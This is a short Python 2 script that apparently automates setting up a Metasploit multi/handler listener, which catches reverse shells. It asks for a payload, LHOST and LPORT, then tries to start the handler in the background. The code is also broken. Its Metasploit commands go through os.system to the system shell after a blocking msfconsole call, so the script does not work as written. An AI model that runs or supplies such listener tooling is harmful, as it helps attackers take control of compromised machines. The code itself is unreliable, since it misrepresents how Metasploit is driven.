import os, time

os.system("clear")
payload = raw_input("What payload are you going to be using? ")
os.system("clear")
ip = raw_input("What is your LHOST? ")
os.system("clear")
port = raw_input("What is your LPORT? ")
os.system("clear")
exploit = raw_input("Do you want to run the exploit immediately? (Y/N) ")
exploitTwo = exploit.lower()

os.system("msfconsole")
print("Script Waiting 10 seconds to allow the Metasploit Console to load fully.")
time.sleep(10)
os.system("use exploit/multi/handler")
os.system("set payload " + payload)
os.system("set LHOST " + ip)
os.system("set lport " + port)
if exploitTwo == "y":
    os.system("exploit -j -z")
elif exploitTwo == "n":
    pass

else:
    print("That is not an allowed response.")